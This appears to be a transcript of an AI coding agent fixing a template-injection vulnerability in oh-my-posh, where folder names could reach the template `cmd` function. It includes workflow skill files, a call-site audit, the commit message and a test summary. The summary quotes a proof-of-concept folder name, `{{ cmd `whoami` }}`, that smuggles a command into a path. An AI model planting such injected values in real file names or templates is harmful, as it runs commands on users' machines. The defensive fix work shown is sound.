refactor(config): simplify option parsing logic
chore(deps): bump github.com/shirou/gopsutil/v4
feat(segment)!: rename template property StartTime to Start

BREAKING CHANGE: template strings using .StartTime must be updated to .Start
```

## Validation Checklist

- [ ] Type is one of the allowed values in .commitlintrc.yml
- [ ] The commit message respects the rules defined in .commitlintrc.yml
- [ ] Scope (if present) reflects the actual area changed
- [ ] Description is imperative mood, no trailing period
- [ ] Full header line (type + scope + description) is 72 characters or fewer
- [ ] Both `!` after type/scope **and** `BREAKING CHANGE:` footer are present whenever the change breaks existing behavior
- [ ] No sensitive files staged (.env, credentials, etc.)

Base directory for this skill: D:\oh-my-posh\.claude\skills\code-changes

# Code Changes

The workflow for going from an issue, pull request, idea, or feature request to shipped code.
Follow the phases in order. Analysis always comes first; code comes last.

Each phase has a reference file with the full instructions. **Read the reference file when you
enter the phase** — not before, and never skip it because the phase "looks obvious".

## Roles

Assign work based on model capability. The coordinator is not the strongest model — it's the one
that stays resident, owns every phase by default, and knows when it's out of its depth.

| Role        | Capability tier                                               | Owns                                                                          |
| ----------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| Coordinator | Capable mid-tier, resident for the whole task                | Analysis, plan, delegation, supervision, verification, delivery — by default |
| Escalation  | Strongest reasoning model available; invoked only on trigger | The specific judgment call the coordinator flagged, then control returns     |
| Implementer | Same tier as coordinator, or smaller for trivial edits        | Executing one pinned, self-contained task                                    |

Concrete model names per vendor (Anthropic, OpenAI, Google) and how to run the split in Claude
Code, GitHub Copilot, Codex, or IDE agents: [references/model-tiers.md](references/model-tiers.md).

When the current agent already runs at implementer tier, there's no separate delegation step for
standard work: plan and execute directly, still following every phase. Escalate to the strongest
model only when a trigger fires — see [references/escalate.md](references/escalate.md) — never by
default and never for a routine judgment call the coordinator is equipped to make itself.

## The flow

1. **Analyze** ([references/analyze.md](references/analyze.md)) — root cause and scope,
   validated against the code, never against the report alone.
2. **Plan** ([references/plan.md](references/plan.md)) — pinned spec, task split, parallel vs
   sequential, workspace per task.
3. **Delegate** ([references/delegate.md](references/delegate.md)) — match each task to the
   right executor, coordinator-tier by default.
4. **Supervise** ([references/supervise.md](references/supervise.md)) — monitor, unblock, and
   critically review implementer output.
5. **Verify** ([references/verify.md](references/verify.md)) — quality gates plus functional
   proof, never delegated downward.
6. **Deliver** ([references/deliver.md](references/deliver.md)) — conventional commits and an
   outcome-first report.

Analyze, Supervise, and Verify each carry an escalation checkpoint — see
[references/escalate.md](references/escalate.md) — for handing one specific judgment call to the
strongest available model without giving up ownership of the phase.

**Stop gate:** Phase 1 ends with reporting the analysis and proposed approach to the user and
waiting for a go. Skip the gate only when the user already gave the go in the request itself
("do it", "fix it and commit", "implement with Sonnet").

## Special cases

These entry points replace or extend Phase 1; the rest of the flow applies unchanged.

- Pull request review comments →
  [references/pr-review-comments.md](references/pr-review-comments.md)
- Issue triage → [references/issue-triage.md](references/issue-triage.md)
New task, new analysis phase. Broader question, security-sensitive and architectural — escalation trigger fires. Sending it to Fable for a full-codebase trust audit before proposing an approach.

content.text:
## Analysis

**The real bug class:** not "path.go had a bug" but "`template.Render`'s template-string argument carries zero provenance — nothing distinguishes text the config-author typed from text assembled at runtime from external data." Fable audited every `template.Render` call site in `src/` (22 total, tests excluded) and traced each template-string argument back to its origin:

- **21 of 22 are TRUSTED** — the template string comes verbatim from a config field (segment `template`/`tooltip`, block `filler`, palette values, `mapped_locations` keys, etc.) or a Go string constant. Everywhere else that touches genuinely untrusted data — package.json fields, git branch/commit metadata, HTTP response bodies, env vars, shell status codes — that data is correctly passed as **context** (`.Field`), never as the template source itself. `text/template` never re-parses context data, so those are safe by construction.
- **1 of 22 is TAINTED** — `src/segments/path.go:285`, the one we already patched. It's tainted because `pt.Path` legitimately needs a second render pass (to resolve `mapped_locations` icon values like `{{ .Env.X }}`), and raw filesystem folder names get swept up into that same string before the render call.

No other sink currently crosses from data-side to template-source-side. But **nothing structurally prevents the next one** — the `escape`/`breakBraceRuns` fix from the last commit is sanitization at one call site, not a guarantee. A future refactor of `folder_format`, or a new segment that does the same "compose then re-render" idiom, could reopen this exact class without anyone noticing, since Go's type system currently can't tell a `string` that's config-authored from one built out of `cmd` output.

There's also no existing gate at all today — no `unsafe`/`allow_*`/`disable_command` option anywhere; `func_map.go` registers `cmd`/`readFile`/`stat`/`glob` unconditionally for every render.

## Proposed fix (Fable's recommendation, which I agree with)

**Type-based provenance — a dual func map**, mirroring how Jinja2's `SandboxedEnvironment` and Go's own `html/template` handle the same "template source vs. data" distinction:

1. New `template.Trusted` string type. `Render` takes a `Trusted`, not a plain `string`. The 21 trusted call sites become mechanical `template.Trusted(cfg.Field)` conversions — no behavior change, `{{ cmd ... }}` keeps working exactly as documented today.
2. New `RenderRestricted(string, any)` using a func map stripped of `cmd`/`readFile`/`stat`/`glob`/`env`/`expandenv`. `path.go:285` switches to this — the one sink that must re-render composed, partly-untrusted text.
3. Important implementation detail Fable flagged: the parsed-template cache (`render.go:55-75`) keys on raw text + context type today; trust level must join that key, or a cache collision between a trusted and restricted render of identical text would silently reuse the wrong func map.
4. A small CI grep restricting which files may call `template.Trusted(...)` (config/prompt/color/segment-option layers only), so a future accidental "trust" conversion at a tainted call site gets caught in review rather than merged silently.

**Why not the alternatives:**
- A global `unsafe_commands` opt-in flag is either a breaking change (default off) or security theater (default on) — and even enabled, it doesn't stop a *tainted* string from reaching `cmd`. Useful only as extra hardening on top of (a), not instead of it.
- "Detect and ban double-render" isn't structurally checkable in Go without provenance typing — which is just option (a) by another name.

**Scope:** `src/template/{text,render,func_map,list}.go` plus ~12 caller files getting one-line `Trusted(...)` wraps, plus tests. Rough estimate: 300-500 line mechanical PR, no config schema change, no breaking change for end users.

**Out of scope / kept as-is:** the `breakBraceRuns` sanitizer from the last commit stays as defense-in-depth even after this lands.

## Open question

Want me to go ahead with this (type-based dual func map), or do you also want the belt-and-suspenders global opt-in flag ((b)) layered on top for defense-in-depth, even though it's not load-bearing on its own?
go ahead with the type-based fix, skip the opt-in flag and remove breakBraceRuns as it's no longer needed. I favor this solution.

content.text:
Base directory for this skill: D:\oh-my-posh\.claude\skills\conventional-commit

# Conventional Commit

## Commit Message Structure

```text
<type>(<scope>): <description>

[optional body]

[optional footer(s)]
```

### Types

| Type       | When to use                                            |
| ---------- | ------------------------------------------------------ |
| `feat`     | A new feature                                          |
| `fix`      | A bug fix                                              |
| `docs`     | Documentation changes, no code                         |
| `style`    | Formatting, missing semicolons, etc. (no logic change) |
| `refactor` | Code change that is neither a fix nor a feature        |
| `perf`     | Performance improvement                                |
| `test`     | Adding or correcting tests                             |
| `ci`       | CI configuration changes                               |
| `chore`    | Maintenance tasks (updating deps, tooling, etc.)       |
| `revert`   | Reverts a previous commit                              |

Append `!` after the type/scope to signal a **breaking change**: `feat!:` or `feat(api)!:`
When a change breaks existing behavior, **both markers are mandatory**: the `!` suffix on the type
**and** the `BREAKING CHANGE:` footer. They always appear together — never one without the other.

### Scope

Optional. Use the name of the area affected, e.g., `segment`, `cache`, `config`, `ui`.
Omit when the change is truly cross-cutting.

### Description

- Required. One short imperative sentence, no period at the end. The full header line (type +
  scope + description) must be **72 characters or fewer**. Aim for **50 characters or fewer for
  the description itself** — this almost always keeps the full header within budget regardless
  of type and scope length.
- Use the imperative mood: "add", not "added" or "adds". Never past tense or present-third-person:
  ✗ `added`, `fixed`, `bumped`, `implemented` → ✓ `add`, `fix`, `bump`, `implement`.
- **Never mirror the input's phrasing.** If the request uses past-tense words (`updated`, `added`,
  `bumped`, `was removed`, `got regenerated`), convert them to imperative before writing the
  description: `update`, `add`, `bump`, `remove`, `regenerate`.

### Body

Optional. Add context about _why_ the change was made, not _what_. The diff shows that.
Wrap at 72 characters.

### Footer

Use for:

- `BREAKING CHANGE: <description>` (required when `!` is used; explains the break).
- Issue references: `Closes #123`, `Fixes #456`.
- Co-authors: `Co-Authored-By: Name <email>`.

## Workflow

1. Run `git status` to review changed files.
2. Run `git diff` and `git diff --cached` to inspect staged and unstaged changes.
3. Identify the **type** from the table above. Ask yourself: does this change **remove, rename, or
   alter existing behavior** that callers depend on? If yes → it is a breaking change: use `!`
   after the type/scope **and** add a `BREAKING CHANGE:` footer. Both markers are always required
   together.
4. Identify the **scope** from the files/area changed.
5. Write a short **description** in the imperative mood.
6. Add a **body** if the _why_ needs explanation.
7. Add a **footer** for breaking changes or issue references.
8. Stage the relevant files explicitly (avoid `git add -A`).
9. Commit with a message that preserves multi-line formatting when body/footer are present.

## Examples

```text
feat(segment): add Ramadan segment with Aladhan API
fix(cache): always store mod time
docs(readme): update installation instructions
refactor(config): simplify option parsing logic
chore(deps): bump github.com/shirou/gopsutil/v4
feat(segment)!: rename template property StartTime to Start

BREAKING CHANGE: template strings using .StartTime must be updated to .Start
```

## Validation Checklist

- [ ] Type is one of the allowed values in .commitlintrc.yml
- [ ] The commit message respects the rules defined in .commitlintrc.yml
- [ ] Scope (if present) reflects the actual area changed
- [ ] Description is imperative mood, no trailing period
- [ ] Full header line (type + scope + description) is 72 characters or fewer
- [ ] Both `!` after type/scope **and** `BREAKING CHANGE:` footer are present whenever the change breaks existing behavior
- [ ] No sensitive files staged (.env, credentials, etc.)

fix(template)!: gate cmd/readFile/stat/glob behind trusted templates

template.Render's func map exposed cmd/readFile/stat/glob/env/expandenv
to any string passed as the template argument, with no way to tell a
template the user authored in their config from one built at runtime
out of external data (filesystem names, command output, ...). That
distinction is exactly what let a malicious folder name reach cmd
(fixed for that one call site in a prior commit); nothing stopped the
same class of bug from reappearing at a future call site.

Introduce a template.Trusted string type. Render now requires a
Trusted argument and keeps the full func map; RenderRestricted takes a
plain string and drops cmd/readFile/stat/glob/env/expandenv. Every
call site that reads its template text from a config field converts to
Trusted (segment/block/palette templates, mapped_locations keys,
folder_separator_template, ...); pt.Path in path.go's setStyle(), the
one sink that re-renders a string composed from raw filesystem folder
names, switches to RenderRestricted. The parsed-template cache key now
includes the trust level so a trusted and a restricted render of
identical text can never share a cached *template.Template and its
func map.

This also removes breakBraceRuns, added in the prior path.go-only fix:
it's redundant now that the restricted func map can't run cmd
regardless of what a folder name contains.

BREAKING CHANGE: template.Render's signature changed from
Render(string, any) to Render(Trusted, any). Any external caller
passing a plain string variable must wrap it in template.Trusted(...);
string literals convert implicitly.
EOF

Committed as [b2e5c128](https://github.com/jandedobbeleer/oh-my-posh/commit/b2e5c128dd1fa3400ec4175d82984b34c976a5b8).

## Summary

Fixed the general bug class rather than just the one instance: `template.Render`'s func map (`cmd`/`readFile`/`stat`/`glob`/`env`/`expandenv`) is now only reachable from a `template.Trusted` string — a type that can only be produced from a config field the user actually typed. Everywhere the template string came from config (segment/block/palette templates, `mapped_locations` keys, `folder_separator_template`, etc. — 20 call sites across `config`, `color`, `prompt`, `segments`) now wraps in `template.Trusted(...)`. The one sink that re-renders a string built from raw filesystem folder names (`path.go`'s `setStyle()`) switched to the new `template.RenderRestricted`, which parses with a func map that simply doesn't have those dangerous functions — so a malicious folder name now fails to parse and is left untouched, rather than being sanitized character-by-character. Per your ask, `breakBraceRuns` (the brace-escaping patch from the prior commit) is gone — it's redundant now.

**Verified:**
- Full build + `GOOS=linux` cross-compile, `go vet` — clean.
- Full test suite (`go test ./...`) — all pass, including updated path-segment regression tests.
- `modernize`, `fieldalignment`, `go mod tidy`, `gofmt`, `golangci-lint` — zero changes/issues.
- Functional: rebuilt CLI, reran the original PoC — folder named `{{ cmd \`whoami\` }}` now renders completely raw and unexecuted (parse fails, restricted map has no `cmd`). Separately confirmed a real segment using `{{ cmd \`whoami\` }}` in its own config-authored template **still executes** — the legitimate feature is untouched.

**Breaking change, called out in the commit footer:** `template.Render`'s signature changed from `(string, any)` to `(Trusted, any)`. Only matters for external code importing this package directly and calling `Render` with a `string` variable (literals convert implicitly) — nothing else in this repo was left broken.

One side note: between your two requests, some local automation in this repo rebased the branch onto `origin/main` and renamed it from `feat/gradient-colors` to `next` (visible in `git reflog`) — not something I did, and your first commit survived intact under a new hash (`dc2e6019`). Both commits are now on `next`, 12 commits ahead of `origin/next`. Not pushed.
internal changes are never breaking changes, only configuration behaviour is.
Fair — that's a real distinction for this repo. Amending the commit message (still unpushed, safe to fix).

---
name: breaking-change-scope
description: In oh-my-posh, BREAKING CHANGE!/footer is reserved for user-facing config behavior changes, never internal Go API/signature changes
metadata:
  type: feedback
---

Only changes to user-facing configuration behavior (schema fields, template
properties, CLI flags, documented template variables) count as breaking
changes in this repo. Changing an internal Go function/type signature (e.g.
`template.Render(string, ...)` → `Render(Trusted, ...)`) is NOT a breaking
change even though it could theoretically break an external importer of the
Go package — do not add `!` after type/scope or a `BREAKING CHANGE:` footer
for that.

**Why:** Jan corrected this directly after a commit
(`fix(template)!: gate cmd/readFile/stat/glob behind trusted templates`)
used `!`/BREAKING CHANGE for an internal template-package signature change.
oh-my-posh's breaking-change signal is scoped to the product's external
contract (config files users write), not Go's internal API surface — the
project isn't consumed as a library in the way that would make internal
signature churn user-visible.

**How to apply:** When drafting a conventional commit in this repo, ask "does
this change what a user puts in their config or how it behaves" before
reaching for `!`/BREAKING CHANGE. Internal refactors, renamed unexported or
exported-but-internal-only Go symbols, changed function signatures used only
within this codebase — plain `fix`/`refactor`/etc., no breaking marker.
